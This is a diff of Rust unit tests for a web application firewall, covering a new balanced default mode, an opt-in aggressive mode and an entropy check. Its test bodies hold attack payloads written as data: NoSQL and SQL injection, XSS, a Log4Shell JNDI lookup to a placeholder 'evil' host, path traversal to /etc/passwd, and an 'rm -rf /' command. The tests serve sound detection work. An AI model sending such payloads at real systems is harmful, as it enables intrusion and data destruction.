-            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            validate_request("POST", Some("application/json"), body, &aggressive_profile()),
             WafVerdict::Deny("injection pattern detected")
         );
     }
 
     #[test]
-    fn denies_nosql_injection_regex() {
+    fn aggressive_denies_nosql_injection_regex() {
         let body = br#"{"username":{"$regex":".*"}}"#;
         assert_eq!(
-            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            validate_request("POST", Some("application/json"), body, &aggressive_profile()),
             WafVerdict::Deny("injection pattern detected")
         );
     }
 
     #[test]
-    fn denies_java_deserialization() {
+    fn aggressive_denies_java_deserialization() {
+        // Java RCE class-name patterns are aggressive-only because they
+        // also appear verbatim in any JVM stack trace forwarded by APMs.
         let body = br#"{"cmd":"Runtime.getRuntime().exec('id')"}"#;
         assert_eq!(
-            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            validate_request("POST", Some("application/json"), body, &aggressive_profile()),
             WafVerdict::Deny("injection pattern detected")
         );
     }
 
     #[test]
-    fn denies_python_deserialization() {
+    fn aggressive_denies_python_deserialization() {
         let body = br#"{"data":"pickle.loads(base64.b64decode(payload))"}"#;
         assert_eq!(
-            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            validate_request("POST", Some("application/json"), body, &aggressive_profile()),
             WafVerdict::Deny("injection pattern detected")
         );
     }
 
     #[test]
-    fn denies_python_os_system() {
+    fn aggressive_denies_python_os_system() {
         let body = br#"{"cmd":"os.system('rm -rf /')"}"#;
         assert_eq!(
-            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            validate_request("POST", Some("application/json"), body, &aggressive_profile()),
             WafVerdict::Deny("injection pattern detected")
         );
     }
@@ -1458,10 +1656,14 @@ mod tests {
     }
 
     #[test]
-    fn denies_graphql_introspection() {
+    fn aggressive_denies_graphql_introspection_with_whitespace() {
+        // `{__schema` (no space) is in BALANCED — see
+        // `denies_graphql_type_probe` which exercises that. With realistic
+        // GraphQL formatting (`{ __schema`), the lone `__schema` token is
+        // what fires, and that lives in AGGRESSIVE.
         let body = br#"{"query":"{ __schema { types { name } } }"}"#;
         assert_eq!(
-            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            validate_request("POST", Some("application/json"), body, &aggressive_profile()),
             WafVerdict::Deny("injection pattern detected")
         );
     }
@@ -1559,5 +1761,266 @@ mod tests {
             validate_request("POST", Some("application/json"), body, &strict_profile()),
             WafVerdict::Deny("injection pattern detected")
         );
+    }
+
+    // ══════════════════════════════════════════════════════════════════
+    // NEW CONTRACT (v0.1.7+):
+    //   * `Balanced` (default) MUST NOT block legitimate developer / dev
+    //     tooling / educational content carrying tokens that the previous
+    //     "all-patterns" WAF flagged as attacks (alert(, eval(, $gt, …).
+    //   * `Aggressive` keeps the broad coverage for routes that opt in.
+    //   * Entropy default 6.5 bits/byte — base64 / JWT must pass; only
+    //     near-random / encrypted payloads are flagged.
+    //   * `entropy_check = false` is a kill switch.
+    // ══════════════════════════════════════════════════════════════════
+
+    #[test]
+    fn balanced_allows_legitimate_alert_in_text() {
+        // Customer-support comment quoting "alert(" as a literal — the
+        // single most common false-positive class with the old WAF.
+        let body = br#"{"comment":"the user clicked alert(true) in the broken page"}"#;
+        assert_eq!(
+            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            WafVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn balanced_allows_eval_and_documentcookie_in_docs() {
+        // MDN-style snippet posted to a docs API — would have been blocked
+        // by `eval(` and `document.cookie`, both now aggressive-only.
+        let body = br#"{"snippet":"never trust eval(input) and never read document.cookie directly"}"#;
+        assert_eq!(
+            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            WafVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn balanced_allows_dollar_prefixed_id() {
+        // `$gt-23` would have matched the unanchored `$gt` mongo pattern.
+        // Aggressive still blocks; balanced lets through.
+        let body = br#"{"id":"$gt-23","tag":"$ne-marker"}"#;
+        assert_eq!(
+            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            WafVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn aggressive_still_blocks_dollar_gt() {
+        // Inverse of above — confirms aggressive mode keeps detection.
+        let body = br#"{"username":{"$gt":""}}"#;
+        assert!(matches!(
+            validate_request("POST", Some("application/json"), body, &aggressive_profile()),
+            WafVerdict::Deny(_)
+        ));
+    }
+
+    #[test]
+    fn balanced_allows_java_stack_trace_payload() {
+        // Stack-trace forwarder POSTs Java class names (Runtime.getRuntime,
+        // ProcessBuilder, ObjectInputStream). Used to be blocked; now must
+        // pass under balanced.
+        let body = br#"{"trace":"java.lang.Runtime.getRuntime called from ProcessBuilder via ObjectInputStream"}"#;
+        assert_eq!(
+            validate_request("POST", Some("application/json"), body, &strict_profile()),
+            WafVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn balanced_keeps_high_signal_xss_blocking() {
+        // Regression guard: balanced mode must STILL block tag-anchored
+        // XSS (`<script`), `onerror=` event handler, `javascript:` sink,
+        // and CVE-class patterns like `${jndi:`. These are the SOC-grade
+        // detections we promise.
+        let cases: &[&[u8]] = &[
+            br#"{"x":"<script>x</script>"}"#,
+            br#"{"x":"<img src=x onerror=foo>"}"#,
+            br#"{"x":"javascript:foo()"}"#,
+            br#"{"x":"${jndi:ldap://evil/a}"}"#,
+            br#"{"x":"' or '1'='1"}"#,
+            br#"{"x":"../../../etc/passwd"}"#,
+        ];
+        for body in cases {
+            assert!(
+                matches!(
+                    validate_request("POST", Some("application/json"), body, &strict_profile()),
+                    WafVerdict::Deny(_)
+                ),
+                "balanced mode must still block: {}",
+                std::str::from_utf8(body).unwrap()
+            );
+        }
+    }
+
+    // ── Entropy: new default 6.5 with toggle ──
+
+    /// Build a body of the form `{"k":"<payload>"}` that reaches the
+    /// entropy gate (≥256 body bytes, ≥128 string-content bytes).
+    fn json_with_string_value(value_bytes: &[u8]) -> Vec<u8> {
+        let mut v = Vec::with_capacity(value_bytes.len() + 12);
+        v.extend_from_slice(br#"{"k":""#);
+        v.extend_from_slice(value_bytes);
+        v.extend_from_slice(br#""}"#);
+        v
+    }
+
+    /// Pseudo-random bytes from a tiny LCG. Self-contained — no rand crate.
+    /// Output entropy is close to 8 bits/byte over a 1KB window, so this
+    /// reliably exceeds the 6.5 default threshold.
+    fn pseudo_random(len: usize, seed: u64) -> Vec<u8> {
+        let mut out = Vec::with_capacity(len);
+        let mut state = seed.wrapping_add(0x9E3779B97F4A7C15);
+        for _ in 0..len {
+            state = state
+                .wrapping_mul(6364136223846793005)
+                .wrapping_add(1442695040888963407);
+            out.push((state >> 56) as u8);
+        }
+        out
+    }
+
+    #[test]
+    fn balanced_allows_base64_payload_in_json() {
+        // Pure-base64 alphabet maxes at 6.0 bits/byte. The old default
+        // (5.5) would have blocked any sufficiently long base64. New
+        // default 6.5 leaves headroom — so JWTs / signed URLs / image
+        // uploads as base64 pass.
+        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        let mut payload = Vec::with_capacity(512);
+        for i in 0..512 {
+            payload.push(alphabet[i % alphabet.len()]);
+        }
+        let body = json_with_string_value(&payload);
+        assert_eq!(
+            validate_request("POST", Some("application/json"), &body, &strict_profile()),
+            WafVerdict::Allow,
+            "balanced threshold (6.5) must let base64 through"
+        );
+    }
+
+    /// Profile that explicitly allows `application/octet-stream` so we
+    /// can exercise the entropy gate on raw binary bodies without the
+    /// JSON gate (or the unknown-content-type short-circuit) firing.
+    fn binary_profile() -> WafProfile {
+        WafProfile {
+            allowed_content_types: vec!["application/octet-stream".to_string()],
+            // Inherit balanced defaults (mode, threshold 6.5, gate on).
+            ..WafProfile::default()
+        }
+    }
+
+    #[test]
+    fn balanced_blocks_random_payload_octet_stream() {
+        // Test the entropy gate in isolation: octet-stream skips the JSON
+        // gate, and `binary_profile` allows the content-type so we don't
+        // short-circuit on Gate 2.
+        let body = pseudo_random(1024, 0xDEAD_BEEF);
+        let v = validate_request(
+            "POST",
+            Some("application/octet-stream"),
+            &body,
+            &binary_profile(),
+        );
+        assert_eq!(
+            v,
+            WafVerdict::Deny("suspicious payload entropy"),
+            "balanced 6.5 threshold must flag near-random payloads, got {:?}",
+            v
+        );
+    }
+
+    #[test]
+    fn entropy_check_disabled_lets_random_through() {
+        // Kill switch: `entropy_check = false` skips Gate 4 entirely.
+        // Same body that the previous test blocks must now pass.
+        let body = pseudo_random(1024, 0xCAFEF00D);
+        let mut p = binary_profile();
+        p.entropy_check = false;
+        assert_eq!(
+            validate_request("POST", Some("application/octet-stream"), &body, &p),
+            WafVerdict::Allow,
+            "entropy_check=false must short-circuit the gate"
+        );
+    }
+
+    #[test]
+    fn entropy_threshold_is_configurable() {
+        // Lower the threshold to the legacy 5.5; base64 again gets denied.
+        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        let mut payload = Vec::with_capacity(512);
+        for i in 0..512 {
+            payload.push(alphabet[i % alphabet.len()]);
+        }
+        let body = json_with_string_value(&payload);
+        let mut p = strict_profile();
+        p.entropy_threshold = 5.5;
+        assert!(matches!(
+            validate_request("POST", Some("application/json"), &body, &p),
+            WafVerdict::Deny(_)
+        ));
+    }
+
+    #[test]
+    fn entropy_skips_low_string_content_json() {
+        // Numeric-heavy JSON has very few string bytes; the JSON-string
+        // entropy path returns None and the gate skips. Body is ≥256
+        // bytes so the size precondition is met.
+        let mut body = Vec::from(&b"{\"data\":["[..]);
+        for i in 0..50 {
+            if i > 0 {
+                body.push(b',');
+            }
+            body.extend_from_slice(format!("{}", i).as_bytes());
+        }
+        body.extend_from_slice(b"]}");
+        // Pad to >= 256 bytes with zero-entropy structural junk OUTSIDE
+        // strings, so the byte count is right but string content stays low.
+        while body.len() < 300 {
+            body.extend_from_slice(b"          ");
+        }
+        assert_eq!(
+            validate_request("POST", Some("application/json"), &body, &strict_profile()),
+            WafVerdict::Allow
+        );
+    }
+
+    #[test]
+    fn json_string_entropy_function_distinguishes_payloads() {
+        // Direct unit test of the new helper, independent of validate_request.
+        let alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        let mut payload = Vec::with_capacity(512);
+        for i in 0..512 {
+            payload.push(alphabet[i % alphabet.len()]);
+        }
+        let base64_body = json_with_string_value(&payload);
+        let e_b64 = shannon_entropy_json_strings(&base64_body, 128).unwrap();
+        assert!(
+            e_b64 < 6.5,
+            "base64 entropy should be below 6.5 (got {})",
+            e_b64
+        );
+
+        let random = pseudo_random(1024, 0x1234_5678);
+        let random: Vec<u8> = random
+            .into_iter()
+            .map(|b| if b == b'"' || b == b'\\' { b'A' } else { b })
+            .collect();
+        let rand_body = json_with_string_value(&random);
+        let e_rand = shannon_entropy_json_strings(&rand_body, 128).unwrap();
+        assert!(
+            e_rand > 7.0,
+            "random-byte entropy should be above 7.0 (got {})",
+            e_rand
+        );
+    }
+
+    #[test]
+    fn json_string_entropy_returns_none_when_undersample() {
+        // Tiny string content under min_sample → None.
+        let body = br#"{"k":"hi","n":42}"#;
+        assert!(shannon_entropy_json_strings(body, 128).is_none());
     }
 }
